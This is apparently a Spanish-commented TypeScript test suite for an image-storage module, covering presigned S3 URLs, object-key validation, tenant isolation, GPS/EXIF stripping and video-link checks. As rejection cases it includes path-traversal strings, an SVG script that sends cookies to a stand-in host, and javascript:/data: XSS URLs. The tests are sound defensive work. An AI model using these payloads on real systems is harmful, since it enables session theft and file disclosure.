import assert from 'node:assert/strict';
import { describe, it } from 'node:test';

import sharp from 'sharp';

import { processProviderImage, normalizeVideoUrl } from '../src/lib/storage/image';
import { asObjectKey, isObjectKey, keyBelongsTo, objectKeyFor } from '../src/lib/storage/key';
import { memoryObjectStore } from '../src/lib/storage/memory';
import { presignS3Url } from '../src/lib/storage/sign';

/**
 * El almacén de imágenes del directorio.
 *
 * Todo esto corre SIN RED y SIN CUENTA de nadie: el adaptador de memoria existe
 * para eso. Así estas pruebas —incluidas las de aislamiento entre dos
 * proveedores— corren en la integración continua como el resto, en vez de ser
 * las que «hay que ejecutar a mano cuando haya credenciales», que es como se
 * acaba sin ellas.
 */

const A = 'cmtyd8zco0000jl7dm2kyzqke';
const B = 'cmtyd8zde0001jl7d1cba7abd';

/** Una imagen de verdad, hecha aquí, con EXIF y coordenadas dentro. */
async function photoWithGps(size = 800): Promise<File> {
  const jpeg = await sharp({
    create: { width: size, height: size, channels: 3, background: '#c9a227' },
  })
    // El EXIF entero es UN bloque dentro del archivo, y las coordenadas GPS son
    // una sección de ese bloque. Así que «el archivo guardado no tiene EXIF» es
    // exactamente «no tiene las coordenadas»: no hay forma de que sobreviva una
    // parte y no la otra. Se escriben marcas reconocibles para poder buscarlas
    // byte a byte en el resultado.
    .withExif({
      IFD0: {
        Make: 'PruebaPhone',
        Model: 'X1',
        Copyright: 'GPS 33.8938N 35.5018E Beirut',
      },
    })
    .jpeg()
    .toBuffer();
  return new File([new Uint8Array(jpeg)], 'foto.jpg', { type: 'image/jpeg' });
}

// ------------------------------------------------------------------ la firma

describe('la firma del almacén', () => {
  it('coincide con el vector de prueba OFICIAL de AWS', () => {
    // Es la única forma honesta de saber si una firma escrita a mano es
    // correcta: compararla con la que publica quien define el algoritmo. Si
    // esto pasa, el almacén de verdad va a aceptar nuestras peticiones; si no,
    // no hay nada que discutir.
    const url = presignS3Url({
      method: 'GET',
      endpoint: 'https://examplebucket.s3.amazonaws.com',
      region: 'us-east-1',
      key: 'test.txt',
      accessKeyId: 'AKIAIOSFODNN7EXAMPLE',
      secretAccessKey: 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY',
      expiresIn: 86400,
      now: new Date('2013-05-24T00:00:00Z'),
    });

    assert.equal(
      new URL(url).searchParams.get('X-Amz-Signature'),
      'aeeed9bbccd4d02ee5c0109b86d86835f995330da4c265957d157751f604d404',
    );
  });

  it('la secreta NO aparece en la dirección', () => {
    const secret = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY';
    const url = presignS3Url({
      method: 'PUT',
      endpoint: 'https://cuenta.r2.cloudflarestorage.com',
      region: 'auto',
      bucket: 'citas',
      key: objectKeyFor(A, 'webp'),
      accessKeyId: 'AKIA',
      secretAccessKey: secret,
      expiresIn: 600,
    });
    assert.equal(url.includes(secret), false);
    assert.equal(url.includes(encodeURIComponent(secret)), false);
    // Y sí lleva la caducidad, que es lo que la hace una dirección y no un
    // permiso permanente.
    assert.equal(new URL(url).searchParams.get('X-Amz-Expires'), '600');
  });

  it('una caducidad imposible se rechaza', () => {
    const base = {
      method: 'GET' as const,
      endpoint: 'https://cuenta.r2.cloudflarestorage.com',
      region: 'auto',
      bucket: 'citas',
      key: 'providers/x/y.webp',
      accessKeyId: 'AKIA',
      secretAccessKey: 's',
    };
    assert.throws(() => presignS3Url({ ...base, expiresIn: 0 }));
    assert.throws(() => presignS3Url({ ...base, expiresIn: -1 }));
    // Más de siete días no lo acepta S3, así que tampoco esto: firmar algo que
    // el almacén va a rechazar es un fallo que aparece tarde y en otro sitio.
    assert.throws(() => presignS3Url({ ...base, expiresIn: 8 * 24 * 3600 }));
  });
});

// ------------------------------------------------------------------ la llave

describe('la llave de un objeto', () => {
  it('la acuña el servidor, con el proveedor dentro', () => {
    const key = objectKeyFor(A, 'webp');
    assert.match(key, /^providers\/cmtyd8zco0000jl7dm2kyzqke\/[a-f0-9-]{36}\.webp$/);
    assert.equal(keyBelongsTo(key, A), true);
    assert.equal(keyBelongsTo(key, B), false);
  });

  it('dos llaves seguidas no son la misma', () => {
    assert.notEqual(objectKeyFor(A, 'webp'), objectKeyFor(A, 'webp'));
  });

  it('el nombre del archivo de quien sube NO aparece', () => {
    // Ni para «conservarlo por comodidad»: es texto de fuera metido en una
    // ruta, y encima cuenta cosas —la carpeta, la cámara, el nombre del
    // cliente de la boda—.
    const key = objectKeyFor(A, 'webp');
    assert.equal(key.includes('foto'), false);
    assert.equal(key.includes('.jpg'), false);
  });

  it('nada que venga de fuera pasa por una llave', () => {
    for (const intento of [
      'providers/../../etc/passwd',
      'providers/' + B + '/../' + A + '/robada.webp',
      'providers/' + A + '/x.svg',
      'providers/' + A + '/x.html',
      'providers/' + A + '//x.webp',
      'providers/x.webp',
      'PROVIDERS/' + A + '/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa.webp',
      'providers/' + A + '/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa.webp?x=1',
      '',
    ]) {
      assert.equal(isObjectKey(intento), false, 'pasó: ' + intento);
      assert.equal(asObjectKey(intento), null, 'pasó: ' + intento);
    }
  });

  it('un id de proveedor con cualquier cosa dentro no acuña nada', () => {
    for (const malo of ['', '../otro', 'CMTY', 'a'.repeat(64), 'con espacio', 'a;b']) {
      assert.throws(() => objectKeyFor(malo, 'webp'), /proveedor|Llave/, 'pasó: ' + malo);
    }
  });
});

// ----------------------------------------------------- el adaptador de memoria

describe('el almacén de memoria', () => {
  it('escribe, lee, borra, y borrar dos veces no falla', async () => {
    const store = memoryObjectStore();
    const key = objectKeyFor(A, 'webp');
    const bytes = new Uint8Array([1, 2, 3, 4]);

    assert.equal(await store.get(key), null);
    assert.equal(await store.head(key), null);

    await store.put(key, bytes, 'image/webp');
    assert.deepEqual((await store.get(key))?.body, bytes);
    assert.deepEqual(await store.head(key), { bytes: 4, contentType: 'image/webp' });

    await store.remove(key);
    assert.equal(await store.get(key), null);
    // Idempotente: borrar lo que ya no está es lo que hace un repaso de
    // huérfanos, y no puede reventar por eso.
    await store.remove(key);
  });

  it('guarda una COPIA, no el buffer de quien llama', async () => {
    const store = memoryObjectStore();
    const key = objectKeyFor(A, 'webp');
    const bytes = new Uint8Array([9, 9]);
    await store.put(key, bytes, 'image/webp');
    // Quien llamó reutiliza su buffer, que es lo normal.
    bytes[0] = 0;
    assert.deepEqual((await store.get(key))?.body, new Uint8Array([9, 9]));
  });

  it('se niega a arrancar en producción', () => {
    // `NODE_ENV` es de solo lectura para TypeScript, y aquí hace falta
    // cambiarlo: es lo único que distingue producción de lo demás.
    const env = process.env as Record<string, string | undefined>;
    const antes = env['NODE_ENV'];
    try {
      env['NODE_ENV'] = 'production';
      // Un almacén en memoria pierde todo al reiniciar el proceso: en
      // producción sería un formulario que dice «guardada» y la tira.
      assert.throws(() => memoryObjectStore(), /producción/);
    } finally {
      env['NODE_ENV'] = antes;
    }
  });

  it('no hay forma de pedirle una dirección de ESCRITURA', () => {
    // El puerto no la tiene, y eso es la prueba: no se puede usar mal lo que
    // no existe. Una subida firmada en el navegador significa que el servidor
    // no ve los bytes y no puede quitarle el GPS a la foto.
    const store = memoryObjectStore();
    assert.equal('signedUploadUrl' in store, false);
    assert.equal('signedWriteUrl' in store, false);
    // Y tampoco `list()`, que es la llamada que se paga caro en un bucle.
    assert.equal('list' in store, false);
  });
});

// ------------------------------------ aislamiento: A y B no se tocan

describe('dos proveedores no se tocan', () => {
  it('B no puede salirse de su sitio', () => {
    const deA = objectKeyFor(A, 'webp');
    assert.equal(keyBelongsTo(deA, B), false);
    assert.equal(asObjectKey('providers/' + B + '/../' + A + '/x.webp'), null);
    assert.equal(keyBelongsTo(objectKeyFor(B, 'webp'), A), false);
  });

  it('lo de A sigue ahí después de que B lo intente', async () => {
    const store = memoryObjectStore();
    const deA = objectKeyFor(A, 'webp');
    await store.put(deA, new Uint8Array([1]), 'image/webp');

    // Una llave con la FORMA correcta sí se puede construir. El aislamiento no
    // lo da la forma: lo da que el WHERE de la consulta lleve el providerId del
    // ámbito ya resuelto. Lo que la forma impide es SALIRSE del sitio de uno.
    const inventada = asObjectKey('providers/' + A + '/aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa.webp');
    assert.notEqual(inventada, null);
    if (inventada !== null) assert.equal(keyBelongsTo(inventada, B), false);

    // Y el objeto de A no se ha tocado.
    assert.deepEqual((await store.get(deA))?.body, new Uint8Array([1]));
  });
});

// ------------------------------------- lo que se sube y lo que queda

describe('lo que se guarda no es lo que se subió', () => {
  it('el EXIF y las coordenadas GPS NO sobreviven', async () => {
    const entra = await photoWithGps();
    const antes = await sharp(Buffer.from(await entra.arrayBuffer())).metadata();
    // Primero: que la prueba esté probando algo. Sin esto, pasaría igual con
    // una imagen que nunca tuvo EXIF.
    assert.notEqual(antes.exif, undefined, 'la imagen de prueba tenía que traer EXIF');

    const result = await processProviderImage(entra);
    assert.ok(!('error' in result), 'no se pudo procesar');

    const despues = await sharp(Buffer.from(result.body)).metadata();
    assert.equal(despues.exif, undefined);
    assert.equal(despues.format, 'webp');

    // Y byte a byte, que es la comprobación que no depende de que `sharp`
    // interprete bien lo que devuelve: si una marca del EXIF apareciera en el
    // archivo guardado, algo se quedó dentro.
    const crudo = Buffer.from(result.body).toString('latin1');
    assert.equal(crudo.includes('PruebaPhone'), false);
    assert.equal(crudo.includes('Beirut'), false);
    assert.equal(crudo.includes('35.5018'), false);
  });

  it('sale WEBP, con su miniatura, y el tipo lo decide el servidor', async () => {
    const result = await processProviderImage(await photoWithGps(1200));
    assert.ok(!('error' in result));
    assert.equal(result.contentType, 'image/webp');
    assert.equal(result.extension, 'webp');
    assert.ok(result.width > 0 && result.height > 0);
    assert.ok(result.thumb.byteLength > 0);
    // La miniatura pesa menos que la imagen: si no, no es una miniatura.
    assert.ok(result.thumb.byteLength < result.body.byteLength);
  });

  it('un lado mayor de 1600 se reduce', async () => {
    const result = await processProviderImage(await photoWithGps(2400));
    assert.ok(!('error' in result));
    assert.equal(Math.max(result.width, result.height), 1600);
  });

  it('un SVG no es una imagen, aunque se llame .webp', async () => {
    const svg =
      '<svg xmlns="http://www.w3.org/2000/svg" width="800" height="800">' +
      '<script>fetch("https://ajeno.example/?c="+document.cookie)</script></svg>';
    const file = new File([svg], 'foto.webp', { type: 'image/webp' });
    const result = await processProviderImage(file);
    assert.ok('error' in result);
  });

  it('ni un HTML, ni un PDF, ni un archivo cortado a medias', async () => {
    const cortado = new Uint8Array([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a]);
    const intentos: [string, BlobPart][] = [
      ['pagina.webp', '<!doctype html><script>alert(1)</script>'],
      ['doc.webp', '%PDF-1.4 algo'],
      ['roto.webp', cortado],
    ];
    for (const [nombre, bytes] of intentos) {
      const result = await processProviderImage(
        new File([bytes], nombre, { type: 'image/webp' }),
      );
      assert.ok('error' in result, 'pasó: ' + nombre);
    }
  });

  it('una imagen diminuta se rechaza, y se dice por qué', async () => {
    const result = await processProviderImage(await photoWithGps(120));
    assert.deepEqual(result, { error: 'tooSmall' });
  });

  it('un archivo de más de ocho megas no se abre siquiera', async () => {
    const gordo = new File([new Uint8Array(9 * 1024 * 1024)], 'g.webp', {
      type: 'image/webp',
    });
    assert.deepEqual(await processProviderImage(gordo), { error: 'tooBig' });
  });
});

// ------------------------------------------------------------------ el vídeo

describe('un vídeo es un enlace de un sitio conocido', () => {
  it('YouTube y Vimeo sí', () => {
    assert.ok(normalizeVideoUrl('https://www.youtube.com/watch?v=abc') !== null);
    assert.ok(normalizeVideoUrl('https://youtu.be/abc') !== null);
    assert.ok(normalizeVideoUrl('https://vimeo.com/123') !== null);
  });

  it('cualquier otra cosa no', () => {
    for (const malo of [
      'https://ajeno.example/video.mp4',
      'http://www.youtube.com/watch?v=abc',
      'javascript:alert(1)',
      'data:text/html,<script>alert(1)</script>',
      'https://youtube.com.ajeno.example/x',
      '',
      'no es una direccion',
    ]) {
      assert.equal(normalizeVideoUrl(malo), null, 'pasó: ' + malo);
    }
  });
});
